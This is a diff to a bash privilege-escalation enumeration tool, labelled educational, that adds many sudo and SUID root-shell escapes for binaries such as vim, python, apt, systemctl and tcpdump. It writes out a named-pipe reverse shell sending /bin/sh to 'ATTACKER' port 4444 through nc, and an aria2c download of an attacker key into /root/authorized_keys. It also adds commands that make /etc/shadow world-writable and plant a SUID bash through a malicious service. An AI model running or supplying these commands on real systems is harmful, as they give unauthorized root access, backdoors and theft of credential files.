@@ -166,12 +166,16 @@ enum_sudo() {
         echo "$sudo_output" | grep "NOPASSWD" | while read line; do
             log "  $line"
             
-            # Extract binary name and provide specific guidance
+# Extract binary name and provide specific guidance
             local bin=$(echo "$line" | grep -oE '[^ ]+$' | xargs basename 2>/dev/null)
             case $bin in
-                vim|vi)
-                    critical "NOPASSWD vim/vi - Instant root: sudo vim -c ':!/bin/sh'"
+                vim)
+                    critical "NOPASSWD vim - Instant root: sudo vim -c ':!/bin/sh'"
                     teach "  → sudo vim -c ':!/bin/sh'"
+                    ;;
+                vi)
+                    critical "NOPASSWD vi - Instant root: sudo vi -c ':!/bin/sh'"
+                    teach "  → sudo vi -c ':!/bin/sh'"
                     ;;
                 nano)
                     critical "NOPASSWD nano - Instant root: sudo nano then ^R^X reset; /bin/sh"
@@ -180,9 +184,13 @@ enum_sudo() {
                 emacs)
                     teach "  → sudo emacs --eval '(term \"/bin/sh\")'"
                     ;;
-                less|more)
-                    critical "NOPASSWD less/more - Instant root: sudo less /etc/profile then !sh"
+                less)
+                    critical "NOPASSWD less - Instant root: sudo less /etc/profile then !sh"
                     teach "  → sudo less /etc/profile, then !sh"
+                    ;;
+                more)
+                    critical "NOPASSWD more - Instant root: sudo more /etc/profile then !sh"
+                    teach "  → sudo more /etc/profile, then !sh"
                     ;;
                 find)
                     critical "NOPASSWD find - Instant root: sudo find . -exec /bin/sh \\; -quit"
@@ -191,17 +199,49 @@ enum_sudo() {
                 xargs)
                     teach "  → sudo xargs -a /dev/null sh"
                     ;;
-                awk|gawk|nawk)
+                awk)
                     critical "NOPASSWD awk - Instant root: sudo awk 'BEGIN {system(\"/bin/sh\")}'"
                     teach "  → sudo awk 'BEGIN {system(\"/bin/sh\")}'"
                     ;;
-                python*|perl|ruby|node)
-                    critical "NOPASSWD $bin - Instant root: sudo $bin -c 'import os; os.system(\"/bin/sh\")'"
-                    teach "  → sudo $bin -c 'import os; os.system(\"/bin/sh\")'"
+                gawk)
+                    critical "NOPASSWD gawk - Instant root: sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
+                    teach "  → sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
                     ;;
-                bash|sh|zsh|dash)
-                    critical "NOPASSWD shell - Instant root: sudo $bin"
-                    teach "  → sudo $bin (it's literally a shell)"
+                nawk)
+                    critical "NOPASSWD nawk - Instant root: sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
+                    teach "  → sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
+                    ;;
+                python*|python)
+                    critical "NOPASSWD python - Instant root: sudo python -c 'import os; os.system(\"/bin/sh\")'"
+                    teach "  → sudo python -c 'import os; os.system(\"/bin/sh\")'"
+                    ;;
+                perl)
+                    critical "NOPASSWD perl - Instant root: sudo perl -e 'exec \"/bin/sh\";'"
+                    teach "  → sudo perl -e 'exec \"/bin/sh\";'"
+                    ;;
+                ruby)
+                    critical "NOPASSWD ruby - Instant root: sudo ruby -e 'exec \"/bin/sh\"'"
+                    teach "  → sudo ruby -e 'exec \"/bin/sh\"'"
+                    ;;
+                node)
+                    critical "NOPASSWD node - Instant root: sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"
+                    teach "  → sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0,1,2]})'"
+                    ;;
+                bash)
+                    critical "NOPASSWD bash - Instant root: sudo bash"
+                    teach "  → sudo bash"
+                    ;;
+                sh)
+                    critical "NOPASSWD sh - Instant root: sudo sh"
+                    teach "  → sudo sh"
+                    ;;
+                zsh)
+                    critical "NOPASSWD zsh - Instant root: sudo zsh"
+                    teach "  → sudo zsh"
+                    ;;
+                dash)
+                    critical "NOPASSWD dash - Instant root: sudo dash"
+                    teach "  → sudo dash"
                     ;;
                 env)
                     critical "NOPASSWD env - Instant root: sudo env /bin/sh"
@@ -218,6 +258,89 @@ enum_sudo() {
                     ;;
                 mysql)
                     teach "  → sudo mysql -e '\\! /bin/sh'"
+                    ;;
+                systemctl)
+                    critical "NOPASSWD systemctl - Shell escape via pager: sudo systemctl status <service> then !sh"
+                    teach "  → sudo systemctl status trail.service"
+                    teach "  → Wait for pager (less), then type: !sh"
+                    ;;
+                yum)
+                    critical "NOPASSWD yum - Plugin exploitation for root shell"
+                    teach "  → Create malicious plugin: echo -e '#!/bin/sh\n/bin/sh' > /tmp/shell.sh"
+                    teach "  → chmod +x /tmp/shell.sh"
+                    teach "  → Create config: echo 'from subprocess import call; call([\"/tmp/shell.sh\"])' > /tmp/cmd.py"
+                    teach "  → sudo yum -c /tmp/cmd.conf --pluginpath=/tmp"
+                    ;;
+                apt|apt-get)
+                    critical "NOPASSWD apt/apt-get - Execute commands via APT::Update::Pre-Invoke"
+                    teach "  → sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
+                    teach "  → Or: echo 'apt::Update::Pre-Invoke {\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f\"};' > /tmp/pwn"
+                    teach "  → sudo apt-get update -c /tmp/pwn"
+                    ;;
+                tail)
+                    teach "  → sudo tail -f /dev/null"
+                    teach "  → Or exploit PATH if tail called without absolute path"
+                    ;;
+                cut)
+                    teach "  → sudo cut -d: -f1 /etc/shadow"
+                    ;;
+                diff)
+                    teach "  → sudo diff --line-format=%L /dev/null /etc/shadow"
+                    ;;
+                strace)
+                    critical "NOPASSWD strace - Attach to process: sudo strace -o /dev/null /bin/sh"
+                    teach "  → sudo strace -o /dev/null /bin/sh"
+                    ;;
+                tcpdump)
+                    critical "NOPASSWD tcpdump - Command injection: sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell.sh"
+                    teach "  → Create shell script in /tmp/shell.sh"
+                    teach "  → sudo tcpdump executes it with -z option"
+                    ;;
+                chmod)
+                    critical "NOPASSWD chmod - Make any file writable: sudo chmod 777 /etc/shadow"
+                    teach "  → sudo chmod 777 /etc/shadow"
+                    teach "  → Then edit /etc/shadow directly"
+                    ;;
+                chown)
+                    critical "NOPASSWD chown - Take ownership: sudo chown $(whoami) /etc/shadow"
+                    teach "  → sudo chown $(whoami) /etc/shadow"
+                    teach "  → Then edit file"
+                    ;;
+                make)
+                    critical "NOPASSWD make - Execute Makefile commands: sudo make -s --eval=$'x:\\n\\t-/bin/sh'"
+                    teach "  → sudo make -s --eval=$'x:\\n\\t-/bin/sh'"
+                    ;;
+                gcc)
+                    teach "  → sudo gcc -wrapper /bin/sh,-s ."
+                    ;;
+                knife)
+                    critical "NOPASSWD knife (Chef) - Execute shell: sudo knife exec -E 'exec \"/bin/sh\"'"
+                    teach "  → sudo knife exec -E 'exec \"/bin/sh\"'"
+                    ;;
+                neofetch)
+                    critical "NOPASSWD neofetch with env_keep - Config file exploitation"
+                    teach "  → echo 'exec /bin/sh' > /tmp/config.conf"
+                    teach "  → export XDG_CONFIG_HOME=/tmp"
+                    teach "  → sudo neofetch"
+                    ;;
+                jjs)
+                    critical "NOPASSWD jjs (Java JavaScript) - Execute commands via Nashorn"
+                    teach "  → echo 'Java.type(\"java.lang.Runtime\").getRuntime().exec(\"/bin/sh\").waitFor()' | sudo jjs"
+                    ;;
+                luvit)
+                    critical "NOPASSWD luvit (Lua) - Execute Lua code as root"
+                    teach "  → sudo luvit -e 'os.execute(\"/bin/sh\")'"
+                    ;;
+                aria2c)
+                    teach "  → sudo aria2c -d /root -o authorized_keys 'http://attacker/key'"
+                    ;;
+                busybox)
+                    critical "NOPASSWD busybox - Execute any busybox applet: sudo busybox sh"
+                    teach "  → sudo busybox sh"
+                    ;;
+                rpm)
+                    teach "  → Create malicious RPM with postinstall script"
+                    teach "  → sudo rpm -i malicious.rpm"
                     ;;
                 *)
                     teach "  → Check GTFOBins for: $bin"
@@ -330,6 +453,16 @@ enum_sudo_version() {
         info "sudo not installed"
     fi
 }
+enum_sudo2() {
+    log "${COLOR_PURPLE}[SUDO PERMISSIONS]${COLOR_RESET}"
+    if sudo -l 2>&1 | grep -v "not allowed"; then
+        warn "Sudo access confirmed"
+        return 0
+    else
+        warn "No sudo access"
+        return 1
+    fi
+}
 # === SUID BINARY ANALYSIS ===
 enum_suid() {
     section "SUID BINARY ANALYSIS"
@@ -392,9 +525,13 @@ enum_suid() {
                     critical "SUID nmap - Instant root: nmap --interactive then !sh"
                     teach "  → nmap --interactive → !sh (older versions)"
                     ;;
-                vim|vi)
+                vim)
                     critical "SUID vim - Instant root: vim -c ':!/bin/sh -p'"
                     teach "  → vim -c ':!/bin/sh -p'"
+                    ;;
+                vi)
+                    critical "SUID vi - Instant root: vi -c ':!/bin/sh -p'"
+                    teach "  → vi -c ':!/bin/sh -p'"
                     ;;
                 nano)
                     teach "  → nano, then ^R^X reset; sh -p"
@@ -404,8 +541,8 @@ enum_suid() {
                     teach "  → find . -exec /bin/sh -p \\; -quit"
                     ;;
                 python*|python)
-                    critical "SUID $basename - Instant root: $basename -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
-                    teach "  → $basename -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+                    critical "SUID python - Instant root: python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
+                    teach "  → python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
                     ;;
                 perl)
                     critical "SUID perl - Instant root: perl -e 'exec \"/bin/sh\", \"-p\";'"
@@ -419,14 +556,56 @@ enum_suid() {
                     critical "SUID node - Instant root: node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'"
                     teach "  → node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0,1,2]})'"
                     ;;
-                cp)
-                    teach "  → Copy /etc/shadow: cp /etc/shadow /tmp/shadow"
+                bash)
+                    critical "SUID bash - Instant root: bash -p"
+                    teach "  → bash -p"
                     ;;
-                mv)
-                    teach "  → Move sensitive files to readable location"
+                sh)
+                    critical "SUID sh - Instant root: sh -p"
+                    teach "  → sh -p"
                     ;;
-                base64)
-                    teach "  → base64 /etc/shadow | base64 --decode"
+                zsh)
+                    critical "SUID zsh - Instant root: zsh"
+                    teach "  → zsh"
+                    ;;
+                awk)
+                    critical "SUID awk - Instant root: awk 'BEGIN {system(\"/bin/sh -p\")}'"
+                    teach "  → awk 'BEGIN {system(\"/bin/sh -p\")}'"
+                    ;;
+                less)
+                    critical "SUID less - Instant root: less /etc/profile then !sh"
+                    teach "  → less /etc/profile, then !sh"
+                    ;;
+                more)
+                    critical "SUID more - Instant root: more /etc/profile then !sh"
+                    teach "  → more /etc/profile, then !sh"
+                    ;;
+                systemctl)
+                    critical "SUID systemctl - Create malicious service"
+                    teach "  → echo '[Service]' > /tmp/root.service"
+                    teach "  → echo 'ExecStart=/bin/sh -c \"chmod +s /bin/bash\"' >> /tmp/root.service"
+                    teach "  → systemctl link /tmp/root.service"
+                    teach "  → systemctl start root"
+                    ;;
+                tail)
+                    teach "  → tail -c1G /etc/shadow (reads file)"
+                    ;;
+                strace)
+                    teach "  → strace -o /dev/null /bin/sh -p"
+                    ;;
+                env)
+                    critical "SUID env - Execute shell: env /bin/sh -p"
+                    teach "  → env /bin/sh -p"
+                    ;;
+                cut)
+                    teach "  → cut -d: -f1 /etc/shadow (reads file)"
+                    ;;
+                diff)
+                    teach "  → diff --line-format=%L /dev/null /etc/shadow"
+                    ;;
+                php)
+                    critical "SUID php - Execute commands: php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"
+                    teach "  → php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"
                     ;;
                 *)
                     teach "  → Analysis steps:"
@@ -2724,7 +2903,7 @@ EOF
     echo -e "\033[32mMMMMMMMMMMMM\033[0m                                     \033[34mMMMMMMMMMMMM\033[0m                            "
     cat << "EOF"
     
-              Educational Privilege Escalation Tool - v1.3
+              Educational Privilege Escalation Tool - v1.3.5
     
     ════════════════════════════════════════════════════════════════
 
@@ -2749,6 +2928,7 @@ EOF
     
     # Permission-based vectors
     enum_sudo
+    enum_sudo2
     enum_sudo_version
     enum_suid
     enum_sgid
